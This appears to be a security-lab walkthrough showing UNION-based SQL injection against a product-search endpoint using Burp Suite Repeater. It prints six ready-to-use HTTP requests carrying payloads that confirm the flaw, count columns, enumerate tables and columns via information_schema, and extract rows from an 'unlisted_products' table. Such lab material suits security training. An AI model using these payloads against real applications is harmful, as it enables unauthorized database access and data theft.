# 🔐 UNION-Based SQL Injection — Burp Suite Step-by-Step

## 📌 Lab Overview

This lab demonstrates how to identify and exploit a **UNION-based SQL Injection** vulnerability in a product-search functionality using **Burp Suite Repeater**.

The objective is to progressively enumerate the database and identify the hidden path.

> **Environment:** Authorized security lab
> 
> 
> **Tool:** Burp Suite
> 
> **Component:** Repeater
> 
> **Target:** `10.48.189.3:8000`
> 
> **Vulnerable Endpoint:** `/searchproducts.php`
> 
> **Parameter:** `search`
> 

---

# 1. Attack Methodology

The complete workflow is:

```
Browser
   │
   ▼
Capture Request with Burp Proxy
   │
   ▼
Send Request to Repeater
   │
   ▼
Confirm SQL Injection
   │
   ▼
Determine Column Count
   │
   ▼
Enumerate Tables
   │
   ▼
Enumerate Columns
   │
   ▼
Identify unlisted_products
   │
   ▼
Extract Records
   │
   ▼
Identify Hidden Path
```

---

# 2. Capture the Request in Burp Suite

Open **Burp Suite**.

Make sure **Proxy → Intercept** is enabled.

Then perform a search in the application.

Burp should capture a request similar to:

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=test
```

The important part is:

```
search=phone
```

This is the parameter being tested.

---

# 3. Send the Request to Repeater

Right-click the intercepted request and select:

```
Send to Repeater
```

Then navigate to:

```
Repeater
```

You can now modify the request repeatedly without having to capture a new request each time.



# 4. Burp Repeater Request Progression

the requests sent through Repeater were:

### Request 1 — SQL Injection Test

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search='
```

---

### Request 2 — Column Count

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT 1,2,3,4,5 -- //
```

---

### Request 3 — Table Enumeration

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT 1,2,table_schema,table_name,1
FROM information_schema.tables -- //
```

---

### Request 4 — Database Structure

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT 1,2,table_schema,table_name,1
FROM information_schema.columns
WHERE table_schema=database() -- //
```

---

### Request 5 — `unlisted_products` Columns

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT 1,2,table_name,column_name,1
FROM information_schema.columns
WHERE table_schema=database()
  AND table_name='unlisted_products' -- //
```

---

### Request 6 — Extract Data

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT description,id,price,product_name,product_type
FROM unlisted_products -- //
```

---


